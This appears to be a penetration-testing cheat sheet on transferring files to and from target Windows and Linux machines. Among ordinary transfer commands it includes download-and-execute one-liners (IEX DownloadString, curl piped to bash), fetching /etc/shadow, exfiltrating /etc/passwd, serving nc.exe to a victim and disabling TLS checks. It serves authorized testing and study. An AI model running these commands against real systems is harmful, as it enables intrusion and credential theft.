---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
---

# Transferring files

## WINDOWS

### Powershell base64 download

```powershell
# Write base64 into file
[IO.File]::WriteAllBytes("C:\Users\Public\test.txt", [Convert]::FromBase64String("aGVsbG8sd29ybGQK"))
```

### Powershell download

```powershell
# Download into disk
(New-Object Net.WebClient).DownloadFile('http://example.com/test.txt','C:\Users\Public\test.txt')

# Download into disk (without blocking the calling thread)
(New-Object Net.WebClient).DownloadFileAsync('http://example.com/test.txt','test.txt')

# Download into disk (PowerShell 3.0+)
Invoke-WebRequest http://example.com/test.txt -OutFile test.txt

# Download into memory
IEX(New-Object Net.WebClient).DownloadString('http://example.com/test.ps1')

# Download into memory
(New-Object Net.WebClient).DownloadString('http://example.com/test.ps1') | IEX

# Download into memory (PowerShell 3.0+)
IEX(iwr 'http://example.com/test.ps1')

# Download into memory (PowerShell 3.0+)
Invoke-WebRequest http://example.com/test.ps1 -UseBasicParsing | IEX

# Bypass SSL/TLS error
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### SMB download

```bash
# Create SMB share
sudo smbserver.py <share> -smb2support /tmp/share
# victim machine
copy \\$IP\<share>\nc.exe

# Create SMB share AUTHENTICATION
sudo smbserver.py <share> -smb2support /tmp/share -username admin -password password123
# victim machine AUTHENTICATION (need to mount first)
net use n: \\$IP\share /user:admin password123
copy n:\nc.exe 
```

### FTP download

```powershell
# Start the FTP server
python3 -m pyftpdlib --port 21

# Same as Powershell downloads (use ftp://)
# Download into disk
(New-Object Net.WebClient).DownloadFile('ftp://example.com/test.txt','C:\Users\Public\test.txt')

# Download into memory
IEX(New-Object Net.WebClient).DownloadString('ftp://example.com/test.ps1')
```

### Powershell base64 upload

```powershell
# Convert into base64
[Convert]::ToBase64String((Get-Content -Path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

### Powershell web upload

```powershell
# Start the UPLOAD server
python3 -m uploadserver

# Download to the target machine
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

# Upload the file
Invoke-FileUpload -Uri http://$IP:8000/upload -File C:\Users\Public\test.txt
```

### Powershell base64 web upload

```powershell
# Start the NC
nc -lnvp 8000

# Send base64 to NC
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Users\Public\test.txt' -Encoding Byte))
Invoke-WebRequest -Uri http://$IP:8000/ -Method POST -Body $b64
```



## LINUX

### Bash base64 download

```bash
# Read as base64
cat test.txt | base64 -w 0 ; echo

# Decode base64
echo -n 'aGVsbG8sd29ybGQK' | base64 -d
```

### Bash web download

```bash
# Download into disk
wget http://$IP/test.txt -O /tmp/test.txt

# Download into disk
curl -o /tmp/test.txt http://$IP/test.txt

# Download into memory
wget -qO- http://$IP/exploit.sh | bash

# Download into memory
curl http://$IP/exploit.sh | bash
```

### SSH download

```bash
# Download file from target
scp root@$IP:/etc/shadow .
```

### Bash web upload

```bash
# Create self-signed certificate
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

# Start the UPLOAD server
mkdir https && https
python3 -m uploadserver 443 --server-certificate /tmp/server.pem

# Upload the file
curl -X POST https://$IP/upload -F 'files=@/etc/passwd' --insecure
```

### SSH upload

```bash
# Upload file to target
scp test.txt root@$IP:/tmp/
```

### Web server type

```bash
# Python server
python3 -m http.server
python2 -m SimpleHTTPServer

# PHP server
php -S 0.0.0.0:8000

# Ruby server
ruby -run -ehttpd . -p8000
```
